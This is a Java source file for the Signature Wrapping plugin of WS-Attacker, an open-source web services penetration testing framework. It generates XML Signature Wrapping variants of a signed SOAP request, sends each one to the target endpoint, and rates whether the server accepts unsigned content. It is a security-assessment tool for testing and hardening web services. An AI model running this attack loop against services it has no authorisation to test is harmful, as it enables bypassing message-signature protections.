/**
 * WS-Attacker - A Modular Web Services Penetration Testing Framework Copyright
 * (C) 2011 Christian Mainka
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.plugin.signatureWrapping;

import com.eviware.soapui.impl.wsdl.WsdlRequest;
import com.eviware.soapui.impl.wsdl.support.soap.SoapUtils;
import com.eviware.soapui.impl.wsdl.support.soap.SoapVersion;
import java.io.*;
import java.util.*;
import javax.xml.xpath.XPathExpressionException;
import org.apache.xmlbeans.XmlException;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.xml.sax.SAXException;
import wsattacker.http.transport.SoapHttpClient;
import wsattacker.http.transport.SoapHttpClientFactory;
import wsattacker.http.transport.SoapResponse;
import wsattacker.library.schemaanalyzer.SchemaAnalyzerFactory;
import wsattacker.library.schemaanalyzer.SchemaAnalyzer;
import wsattacker.library.signatureWrapping.option.Payload;
import wsattacker.library.signatureWrapping.util.exception.InvalidWeaknessException;
import wsattacker.library.signatureWrapping.util.signature.SignatureManager;
import wsattacker.library.signatureWrapping.xpath.weakness.util.WeaknessLog;
import wsattacker.library.signatureWrapping.xpath.wrapping.WrappingOracle;
import wsattacker.library.xmlutilities.dom.DomUtilities;
import wsattacker.main.composition.plugin.AbstractPlugin;
import wsattacker.main.composition.plugin.PluginFunctionInterface;
import wsattacker.main.composition.testsuite.RequestResponsePair;
import wsattacker.main.plugin.PluginState;
import wsattacker.main.testsuite.TestSuite;
import wsattacker.plugin.signatureWrapping.function.postanalyze.SignatureWrappingAnalyzeFunction;
import wsattacker.plugin.signatureWrapping.function.postanalyze.model.AnalysisDataCollector;
import wsattacker.plugin.signatureWrapping.option.OptionManager;

/**
 * This class integrates the XSW Plugin into the WS-Attacker framework.
 */
public class SignatureWrapping
    extends AbstractPlugin
{

    public static final String ANALYSISDATA_SUCCESSFUL_STRING = "Successful Attack";

    public static final String ANALYSISDATA_NOFAULT_STRING = "No Fault Response";

    public static final String ANALYSISDATA_NULL_STRING = "NULL Response";

    public static final String ANALYSISDATA_NONXML_STRING = "Non XML Response";

    private static final long serialVersionUID = 1L;

    private static final String NAME = "Signature Wrapping";

    private static final String AUTHOR = "Christian Mainka";

    private static final String[] CATEGORY = new String[] { "Security", "Signature" };

    private static final String VERSION = "1.6 / 2015-05-20";

    private SignatureManager signatureManager;

    private OptionManager optionManager;

    private SchemaAnalyzer schemaAnalyser;

    private SchemaAnalyzer usedSchemaAnalyser;

    private WrappingOracle wrappingOracle;

    private AnalysisDataCollector analysisData;

    private final int successThreashold = 70;

    private String originalSoapAction = null;

    /**
     * Initializes the XSW Plungin. Creates the SchemaAnalyzer, the SignatureManager and the OptionManger.
     */
    @Override
    public void initializePlugin()
    {
        initData();
        this.schemaAnalyser = SchemaAnalyzerFactory.getInstance( SchemaAnalyzerFactory.ALL );
        this.usedSchemaAnalyser = schemaAnalyser;
        this.signatureManager = new SignatureManager();
        this.optionManager = OptionManager.getInstance();
        this.optionManager.setPlugin( this );
        this.optionManager.setSignatureManager( signatureManager );
        this.analysisData = new AnalysisDataCollector();
        setPluginFunctions( new PluginFunctionInterface[] { new SignatureWrappingAnalyzeFunction( this ) } );
        TestSuite.getInstance().getCurrentRequest().addCurrentRequestContentObserver( optionManager );
    }

    public void initData()
    {
        setName( NAME );
        setAuthor( AUTHOR );
        setCategory( CATEGORY );
        setVersion( VERSION );
        StringBuilder description = new StringBuilder();
        description.append( "<html><p>Tries several XML Signature Wrapping techniques to invoke a Service with unsigned content.</p>" );
        description.append( "<p>Currently supported techniques:</p><ul>" );
        description.append( "<li>Attack ID References.</li>" );
        description.append( "<li>Abuse descendant* Axis, e.g. double-slash in XPath.</li>" );
        description.append( "<li>Abuse attribute expressions in XPaths.</li>" );
        description.append( "<li>Try namespace-injection attack to attack prefixes in XPaths.</li>" );
        // description.append("The Attack can use XML Schema files to reduces the number of tries (and so speed up the attack) by creating only Schema-Valid attack requests.");
        // description.append("If some payload is marked as a timestamp, it will be updated and wrapped automatically.");
        // description.append("Note: In some cases, it makes sense to change the payload to a different operation.");
        // description.append("You can also change the SoapActionHeader if you like.");
        description.append( "</ul><p>"
            + "At least one signed part needs some valid XML payload, otherwise the plugin is <i>not configured</i>.</p></html>" );
        // description.append("By default, the attack is successfull if the response is not a SOAP Error.");
        // description.append("To change this, a search string can be specified to ignore responses without this string.");
        setDescription( description.toString() );
    }

    public void setUsedSchemaFiles( List<File> fileList )
    {
        log().info( "Cleared all Schemas" );
        schemaAnalyser = SchemaAnalyzerFactory.getInstance( SchemaAnalyzerFactory.EMPTY );
        for ( File f : fileList )
        {
            try
            {
                Document schema = DomUtilities.readDocument( f );
                log().info( "Adding Schema " + f.getName() );
                schemaAnalyser.appendSchema( schema );
            }
            catch ( Exception e )
            {
                log().warn( "Could not read Schema file '" + f.getName() + "'" );
            }
        }
    }

    public void setSchemaAnalyzerDepdingOnOption()
    {
        if ( optionManager.getOptionNoSchema().isOn() )
        {
            usedSchemaAnalyser = SchemaAnalyzerFactory.getInstance( SchemaAnalyzerFactory.NULL );
        }
        else
        {
            usedSchemaAnalyser = schemaAnalyser;
        }
    }

    /**
     * This is the attack implementation. Basically, it takes the original requests and asks the WrappingOracle for an
     * XSW message. All possibilities will be sent consecutively to the web service endpoint. The reply is then analyzed
     * if the attack was successful.
     */
    @Override
    protected void attackImplementationHook( RequestResponsePair original )
    {
        // should the soapaction be changed?
        // TODO: Fixme
        // if ( optionManager.getOptionSoapAction().getSelectedIndex() > 0 )
        // {
        // originalSoapAction = attackRequest.getOperation().getAction();
        // attackRequest.getOperation().setAction( optionManager.getOptionSoapAction().getValueAsString() );
        // }

        analysisData = new AnalysisDataCollector();

        wrappingOracle =
            new WrappingOracle( signatureManager.getDocument(), signatureManager.getPayloads(), usedSchemaAnalyser );

        int signedElements = wrappingOracle.getCountSignedElements();
        int elementsByID = wrappingOracle.getCountElementsReferedByID();
        int elementsByXPath = wrappingOracle.getCountElementsReferedByXPath();
        int elementsByFastXPath = wrappingOracle.getCountElementsReferedByFastXPath();
        int elementsByPrefixfreeTransformedFastXPath =
            wrappingOracle.getCountElementsReferedByPrefixfreeTransformedFastXPath();

        important( String.format( "%d signed Elements:\n--> %d by ID\n--> %d by XPath\n  `--> %d by FastXPath\n  `--> %d by prefix free FastXPath (best)",
                                  signedElements, elementsByID, elementsByXPath, elementsByFastXPath,
                                  elementsByPrefixfreeTransformedFastXPath ) );

        // should the answer contain a specific string
        String searchString = optionManager.getOptionTheContainedString().getValue();
        boolean search = ( !searchString.isEmpty() && optionManager.getOptionMustContainString().isOn() );

        SoapHttpClient client = SoapHttpClientFactory.createSoapHttpClient( original.getWsdlRequest() );

        // start attacking
        int successCounter = 0;
        int max = wrappingOracle.maxPossibilities();
        Document attackDocument;
        info( "Found " + max + " wrapping possibilites." );
        for ( int i = 0; i < max; ++i )
        {
            info( "Trying possibility " + ( i + 1 ) + "/" + max );
            try
            {
                attackDocument = wrappingOracle.getPossibility( i );
            }
            catch ( InvalidWeaknessException e )
            {
                log().warn( "Could not abuse the weakness. " + e.getMessage() );
                continue;
            }
            catch ( Exception e )
            {
                log().error( "Unknown error. " + e.getMessage() );
                // critical("Unknown error. " + e.getMessage() + "\n" +
                // WeaknessLog.representation());
                continue;
            }
            // DomUtilities.writeDocument(attackDocument,
            // String.format("/tmp/xsw/attack_%04d.xml", i+1), true);
            info( WeaknessLog.representation() );
            String attackDocumentAsString = DomUtilities.domToString( attackDocument );
            SoapResponse response;
            try
            {
                response = client.sendSoap( attackDocumentAsString );
            }
            catch ( IOException ex )
            {
                log().warn( "Could not submit the request. Trying next one. ", ex );
                continue;
            }
            String responseContent = null;
            if ( response != null )
            {
                responseContent = response.getBody();
            }
            else
            {
                info( "Error: Got empty SOAP response." );
            }
            if ( responseContent == null )
            {
                trace( "Request:\n" + DomUtilities.showOnlyImportant( attackDocumentAsString ) );
                important( "The server's answer was empty. Server misconfiguration?" );
                analysisData.add( ANALYSISDATA_NULL_STRING, i, "" );
                continue;
            }

            try
            {
                SoapVersion soapVersion = original.getWsdlRequest().getOperation().getInterface().getSoapVersion();
                if ( SoapUtils.isSoapFault( responseContent, soapVersion ) )
                {
                    trace( "Request:\n" + DomUtilities.showOnlyImportant( attackDocumentAsString ) );
                    // trace("Request:\n" +
                    // (submit.getRequest().getRequestContent()));
                    info( "Server does not accept the message, you got a SOAP error." );
                    trace( "Response:\n" + DomUtilities.showOnlyImportant( responseContent ) );

                    // Now we have to find the SOAPFault reason:
                    String xpath;
                    if ( soapVersion.equals( SoapVersion.Soap11 ) )
                    {
                        xpath =
                            "/*[local-name()='Envelope'][1]/*[local-name()='Body'][1]/*[local-name()='Fault'][1]/*[local-name()='faultstring'][1]";
                    }
                    else
                    {
                        xpath =
                            "/*[local-name()='Envelope'][1]/*[local-name()='Body'][1]/*[local-name()='Fault'][1]/*[local-name()='Reason'][1]/*[local-name()='Text'][1]";
                    }
                    // We have a valid response, saving
                    Document doc;
                    try
                    {
                        doc = DomUtilities.stringToDom( responseContent );
                        List<Element> match;
                        try
                        {
                            match = (List<Element>) DomUtilities.evaluateXPath( doc, xpath );
                            StringBuilder sb = new StringBuilder();
                            for ( Element ele : match )
                            {
                                sb.append( ele.getTextContent() ).append( " " );
                            }
                            if ( sb.length() > 0 )
                            {
                                analysisData.add( sb.toString(), i, responseContent );
                            }
                        }
                        catch ( XPathExpressionException ex )
                        {
                            java.util.logging.Logger.getLogger( SignatureWrapping.class.getName() ).log( java.util.logging.Level.SEVERE,
                                                                                                         null, ex );
                        }
                    }
                    catch ( SAXException ex )
                    {
                        java.util.logging.Logger.getLogger( SignatureWrapping.class.getName() ).log( java.util.logging.Level.SEVERE,
                                                                                                     null, ex );
                    }

                    continue;
                }
            }
            catch ( XmlException e )
            {
                trace( "Request:\n" + DomUtilities.showOnlyImportant( attackDocumentAsString ) );
                // trace("Request:\n" +
                // (submit.getRequest().getRequestContent()));
                info( "The answer is not valid XML. Server missconfiguration?" );
                analysisData.add( ANALYSISDATA_NONXML_STRING, i, responseContent );
                continue;
            }

            if ( search )
            {
                int index = responseContent.indexOf( searchString );
                if ( index < 0 )
                {
                    info( "The answer does not contain the searchstring:\n" + searchString );
                    analysisData.add( ANALYSISDATA_NOFAULT_STRING, i, responseContent );
                    continue;
                }
                else
                {
                    important( "The answer contains the searchstring:\n" + searchString );
                    analysisData.add( ANALYSISDATA_SUCCESSFUL_STRING, i, responseContent );
                }
            }
            else
            {
                analysisData.add( ANALYSISDATA_SUCCESSFUL_STRING, i, responseContent );
            }

            critical( "Server Accepted the Request with Possibility " + ( i + 1 ) + "." );
            important( String.format( "Attack-Vector:\n\n%s\nRequest:\n%s", WeaknessLog.representation(),
                                      DomUtilities.showOnlyImportant( attackDocumentAsString ) ) );
            info( "Response:\n" + DomUtilities.showOnlyImportant( responseContent ) );
            setCurrentPoints( getMaxPoints() );
            ++successCounter;
            if ( optionManager.getAbortOnFirstSuccess().isOn() )
            {
                break;
            }
        }

        // Generate Result
        // ///////////////
        String message = "";
        if ( getCurrentPoints() >= successThreashold )
        {
            message = "CRITICAL: Server could be successfully attacked!";
        }
        else if ( signedElements == elementsByPrefixfreeTransformedFastXPath )
        {
            setCurrentPoints( 0 );
            message = "Everything is Okay: Server uses transformed prefix-free FastXPath. Best practices.";
        }
        else if ( signedElements == elementsByFastXPath )
        {
            setCurrentPoints( 10 );
            message = "Good: Server uses FastXPath.";
        }
        else if ( signedElements == elementsByXPath )
        {
            setCurrentPoints( 20 );
            message = "Okay: Server uses XPaths, but could not be successfully attacked.";
        }
        else if ( elementsByXPath > 0 && elementsByID > 0 )
        {
            setCurrentPoints( 20 );
            message = "Warning: Server uses ID References and XPaths mixed. Only XPaths are recommended.";
        }
        else if ( signedElements == elementsByID )
        {
            setCurrentPoints( 20 );
            message = "Warning: Server uses ID References but could not be successfully attacked.";
        }
        else
        {
            message = "### This is a not expected result";
        }

        // print result
        if ( getCurrentPoints() < successThreashold )
        {
            important( message );
        }
        else
        {
            critical( message );
        }

        if ( successCounter > 0 && !optionManager.getAbortOnFirstSuccess().isOn() )
        {
            important( String.format( "Found %d of %d working XSW messages.", successCounter, max ) );
        }

    }

    /**
     * The attack is only successful if the XSW message is accepted.
     */
    @Override
    public boolean wasSuccessful()
    {
        return isFinished() && getCurrentPoints() >= successThreashold;
    }

    public void checkState()
    {
        // Change does not have payload -> Check if we have still *any* payload
        log().debug( "### CHECK_STATE" );
        List<Payload> list = signatureManager.getPayloads();
        if ( list.isEmpty() )
        {
            log().debug( "### List Empty -> Not_Configured" );
            // No possible payloads found -> Request does not have a Signature
            setState( PluginState.Not_Configured );
        }
        else
        {
            for ( Payload payload : list )
            {
                if ( log().isDebugEnabled() )
                {
                    log().debug( String.format( "### Checking Option %s", payload.toString() ) );
                }
                if ( payload.isTimestamp() || payload.hasPayload() )
                {
                    setState( PluginState.Ready );
                    return;
                }
            }
            log().debug( "### Finally -> Not_Configured" );
            setState( PluginState.Not_Configured );
        }
    }

    /**
     * Clean means to remove the attack request, set the current points to zero and check the plugin state.
     */
    @Override
    public void clean()
    {
        setCurrentPoints( 0 );
        checkState();
    }

    /**
     * If the plugin is stopped by user interaction, the attack request must be removed.
     */
    @Override
    public void stopHook()
    {
    }

    public SignatureManager getSignatureManager()
    {
        return signatureManager;
    }

    public SchemaAnalyzer getUsedSchemaAnalyser()
    {
        return usedSchemaAnalyser;
    }

    public AnalysisDataCollector getAnalysisData()
    {
        return analysisData;
    }

    // TODO: Remove this, only for building GUI...
    public void setAnalysisData( AnalysisDataCollector testData )
    {
        this.analysisData = testData;
    }

    public WrappingOracle getWrappingOracle()
    {
        return wrappingOracle;
    }
}
